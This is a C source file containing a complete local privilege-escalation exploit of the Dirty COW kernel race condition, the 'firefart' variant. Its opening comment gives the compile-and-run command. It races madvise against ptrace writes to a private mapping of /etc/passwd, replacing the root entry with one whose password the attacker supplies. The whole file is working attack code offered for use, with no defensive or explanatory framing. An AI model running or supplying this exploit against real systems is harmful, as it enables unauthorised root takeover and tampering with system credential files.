//gcc -pthread exploit.c -lcrypt -o exploit && ./exploit

#include <fcntl.h>
#include <pthread.h>
#include <string.h>
#include <stdio.h>
#include <stdint.h>
#include <sys/mman.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <sys/wait.h>
#include <sys/ptrace.h>
#include <stdlib.h>
#include <unistd.h>
#include <crypt.h>

const char *filename = "/etc/passwd";

int         f;
void        *map;
pid_t       pid;
pthread_t   pth;
struct stat st;

struct Userinfo {
    char    *username;
    char    *hash;
    int     user_id;
    int     group_id;
    char    *info;
    char    *home_dir;
    char    *shell;
};

char    *generate_pwd_line(struct Userinfo user) {
    const char *format = "%s:%s:%d:%d:%s:%s:%s\n";
    int         size = snprintf(NULL, 0, format, user.username, user.hash, user.user_id, user.group_id, user.info, user.home_dir, user.shell);
    char        *ret = malloc(size + 1);

    sprintf(ret, format, user.username, user.hash, user.user_id, user.group_id, user.info, user.home_dir, user.shell);
    return ret;
}

void    *madviste_thread(void *arg) {
    int i, c = 0;

    while (i < 200000000) {
        c += madvise(map, 100, MADV_DONTNEED);
        i++;
    }
}

int main(int ac, char **av) {
    struct Userinfo user;
  
    user.username = "root";
    user.user_id = 0;
    user.group_id = 0;
    user.info = "aaaaaa";
    user.home_dir = "/root";
    user.shell = "/bin/bash";


    char    *text_pwd;
    char    *line_pwd;

    if (ac >= 2) {
        text_pwd = av[1];
        printf("Please enter the new password: %s\n", text_pwd);
    } else {
        text_pwd = getpass("Please enter the new password: ");
    }
    
    user.hash = crypt(text_pwd, (const char *)"firefart");
    line_pwd = generate_pwd_line(user);

    printf("COMPLETE LINE: %s\n", line_pwd);

    f = open(filename, O_RDONLY);
    fstat(f, &st);

    map = mmap(NULL, st.st_size + sizeof(long), PROT_READ, MAP_PRIVATE, f, 0);
    printf("mmap: %lx\n", (unsigned long)map);
    pid = fork();

    if (pid) {
        waitpid(pid, NULL, 0);
        int i,j,k,c;
        int len = strlen(line_pwd);

        i = 0;
        while (i < 10000/len) {
            j = 0;
            while (j < len) {
                k = 0;
                while (k < 10000) {
                    c += ptrace(PTRACE_POKETEXT, pid, map + j, *((long *)(line_pwd + j)));

                    k++;
                }
                j++;
            }
            i++;
        }
    } else {
        pthread_create(&pth, NULL, madviste_thread, NULL);
        ptrace(PTRACE_TRACEME);
        kill(getpid(), SIGSTOP);
        pthread_join(pth, NULL);
    }
    return 0;
}